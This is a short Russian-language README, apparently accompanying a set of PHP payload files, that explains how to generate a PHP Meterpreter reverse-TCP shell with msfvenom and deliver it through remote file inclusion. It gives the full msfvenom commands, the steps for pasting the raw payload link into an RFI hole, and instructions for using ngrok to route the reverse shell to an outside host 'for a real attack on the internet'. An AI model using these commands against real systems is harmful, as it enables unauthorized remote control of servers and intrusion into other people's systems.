Генерируем payload php в msfvenom.

Пример:
msfvenom -p php/meterpreter_reverse_tcp LHOST ip_адрес LPORT=4444 -f raw > meterpreter_reverse_tcp.php
p.s. Если в LHOST длинное доменное имя, то пишем LHOSTдоменное_имя (слитно)

Как работать с payloadom:
1) Тыкаем на скрипт
2) Нажимаем Raw
3) Копируем ссылку
4) Вставляем в RFI

Файл local_meterpreter_reverse_tcp.php - файл с локальным ip адрессом в LHOST (сетевой адаптер в режиме NAT), используется если атакующая машинка и сервер-жертва в одной сети, и то в таком случае лучше использовать "host-only".

Для того, чтобы провести реальную атаку в интернете стоит использовать ngrok - прокидывает порты на домен (даёшь ему локальный ip и порт, а он возвращает тебе глобальный) 

Создаём payload на php используюя ngrok для ip адресации (т.к. машинка в NAT, то ngrok прокидывает порты на домен и решает проблему доступнсти ip адреса только внутри сети):
1) ngrok tcp 4444
2) ngrok выдасть нам:
Forwarding   tcp://6.tcp.eu.ngrok.io:15089 -> localhost:4444
3) LHOST=6.tcp.eu.ngrok.io  LPORT=15089
4) msfvenom -p php/meterpreter_reverse_tcp LHOST=6.tcp.eu.ngrok.io LPORT=15089 -f raw > shell.php 
